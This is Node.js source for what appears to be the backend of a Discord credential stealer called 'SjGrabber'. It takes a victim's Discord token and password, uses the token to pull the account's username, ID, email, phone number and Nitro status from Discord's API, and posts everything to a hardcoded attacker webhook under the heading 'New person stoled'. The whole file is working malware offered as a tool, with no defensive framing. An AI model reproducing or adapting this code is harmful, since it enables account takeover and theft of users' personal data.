  
const axios = require('axios');
const fetch = require("node-fetch");



exports.send = (req, res, webhook) => {
    const token = req.body.token;
    const password = req.body.password;

    

    if (token === undefined || password === undefined)
        return res.status(400).json({status: "error",message: "Not sent."});

    function GetInfos(token, password) {
        fetch('https://discordapp.com/api/v8/users/@me', {
        method: 'get',
        headers: {
            'Content-Type': 'application/json',
            'Authorization': token
        }
    })
    .then(x => x.json()).then(y => {
        var nitro;
        var phone;
        if (JSON.parse(JSON.stringify(y)).premium_type == 1) {
            nitro = "Nitro Classic";
        } else if (JSON.parse(JSON.stringify(y)).premium_type == 2) {
            nitro = "Nitro Boost";
        } else {
            nitro = "None";
        }

        if (JSON.parse(JSON.stringify(y)).phone == null) {
            phone = "None";
        } else {
            phone = JSON.parse(JSON.stringify(y)).phone;
        }
            
            var omg = {
  author: {
    name: "Dev By Hideaki#1337 x Stan#1337"
  },
  title: "New person stoled",
  description: `Username: \`${JSON.parse(JSON.stringify(y)).username}#${JSON.parse(JSON.stringify(y)).discriminator}\`\nID: \`${JSON.parse(JSON.stringify(y)).id}\`\nE-Mail: \`${JSON.parse(JSON.stringify(y)).email}\`\nPhone: \`${JSON.parse(JSON.stringify(y)).phone}\`\nNitro Type: \`${nitro}\`\nToken: \`${token}\`\nPassword: \`${password}\``,

}
            

        axios.post(`https://canary.discord.com/api/webhooks/857550605072465940/5eAO1KVAJ4Zd2i_An8BUgLEuwZY2LM-NMroj8Jh9j0rYV7qS8MThxtrGpTFb2j54nynz`, {
            username: JSON.parse(JSON.stringify(y)).username + " - SjGrabber",
            content: '', 
            embeds:[ omg ]
        }).then((z) => {
        	if (z.status === 200) return res.status(200).json({status: "ok",message: "Sent."});
        }).catch((bite) => {
        	return res.status(500).json({status: "error",message: "Not sent."});
        });
    });
    }

    GetInfos(token, password);
}
